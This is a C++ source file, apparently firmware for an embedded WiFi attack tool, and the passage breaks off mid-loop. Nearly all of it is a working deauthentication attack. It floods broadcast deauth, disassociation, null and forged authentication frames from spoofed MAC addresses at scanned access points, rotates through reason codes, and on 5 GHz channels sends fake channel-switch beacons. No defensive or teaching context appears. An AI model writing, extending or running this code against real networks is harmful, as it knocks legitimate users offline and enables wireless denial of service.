#include "attack_runner.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "../../debug.h"
#include "../config/app_config.h"
#include "../core/led_controller.h"
#include "../ble/ble_manager.h"
#include "../interference/interference.h"
#include "../oled/oled_display.h"
#include "../packet-injection/packet-injection.h"
#include "../security/security_utils.h"
#include "../spammer/spammer.h"
#include "../wifi/wifi_scanner.h"

std::map<int, std::vector<int>> g_deauth_channels;

static const uint8_t kCsaGhostChannels[] = {36, 40, 44, 48, 149, 153, 157, 161};
static uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void attackPrepareStaRadio() {
    wifi_off();
    delay(100);
    wifi_on(RTW_MODE_STA);
    delay(150);
    wifi_disable_powersave();
}

static uint32_t _sendDeauthPulseForTarget(uint8_t* bssid, const char* ssid, bool is_5g,
                                          uint16_t reason, uint32_t& mac_seq, size_t& csa_idx) {
    mac_seq++;
    uint8_t rand_mac[6] = {
        0x02,
        (uint8_t)(mac_seq >> 24),
        (uint8_t)(mac_seq >> 16),
        (uint8_t)(mac_seq >> 8),
        (uint8_t)mac_seq,
        0xAA
    };

    uint32_t sent = 0;
    if (is_5g) {
        if (wifi_tx_deauth_nav(bssid, kBcastMac, reason)) sent++;
        uint8_t ghost_ch = kCsaGhostChannels[csa_idx % sizeof(kCsaGhostChannels)];
        csa_idx++;
        if (wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch)) sent++;
        if (wifi_tx_beacon_csa_frame(bssid, kBcastMac, ssid, ghost_ch)) sent++;
    }

    if (wifi_tx_deauth_frame(bssid, kBcastMac, reason)) sent++;
    if (wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid)) sent++;
    if (wifi_tx_disassoc_frame(bssid, kBcastMac, reason)) sent++;
    if (wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid)) sent++;
    if (wifi_tx_null_frame(bssid, kBcastMac)) sent++;
    if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
    if (wifi_tx_beacon_frame(bssid, kBcastMac, ssid)) sent++;
    if (wifi_tx_deauth_frame(bssid, kBcastMac, reason)) sent++;
    if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;

    return sent;
}

static void _runDeauthLoop() {
    std::vector<int> target_channels;
    target_channels.reserve(g_deauth_channels.size());
    for (const auto& entry : g_deauth_channels) {
        if (!is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
    }
    for (const auto& entry : g_deauth_channels) {
        if (is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
    }

    if (target_channels.empty()) {
        g_app.attack_mode = AttackMode::IDLE;
        return;
    }

    int last_ch = -1;
    uint32_t fast_mac_counter = 0;
    size_t csa_ghost_idx = 0;
    const uint16_t reasons[] = {g_app.config.deauth_reason, 8, 1, 4, 6, 7};
    const int total_targets = (int)g_deauth_channels.size();

    oled_attack_start();
    g_app.channel_needs_restore = true;

    while (g_app.attack_mode == AttackMode::DEAUTH) {
        for (int ch : target_channels) {
            if (ch != last_ch) {
                wext_set_channel(WLAN0_NAME, ch);
                if (last_ch >= 0 && ((last_ch <= 14 && ch > 14) || (last_ch > 14 && ch <= 14))) {
                    delay(BAND_SWITCH_DELAY_MS);
                } else {
                    delay(SAME_BAND_DELAY_MS);
                }
                last_ch = ch;
            }

            if (g_deauth_channels.count(ch)) {
                ledSetBlue(true);
                const bool is_5g = is5GhzChannel(ch);
                const int pulses = g_app.config.frames_per_deauth;
                const std::vector<int>& indices = g_deauth_channels[ch];

                for (int i = 0; i < pulses; i++) {
                    uint16_t reason = reasons[i % (sizeof(reasons) / sizeof(reasons[0]))];
                    for (int idx : indices) {
                        if (idx < 0 || (size_t)idx >= g_scan_results.size()) continue;
                        WiFiScanResult& ap = g_scan_results[(size_t)idx];
                        g_app.sent_frames += _sendDeauthPulseForTarget(
                            ap.bssid, ap.ssid.c_str(), is_5g, reason, fast_mac_counter, csa_ghost_idx);
                    }
                    if ((i & 3) == 3) {
                        oled_show_deauth(total_targets, g_app.sent_frames);
                    }
                    delay(1);
                }
                ledSetBlue(false);
            }
            oled_show_deauth(total_targets, g_app.sent_frames);
        }
        delay(1);
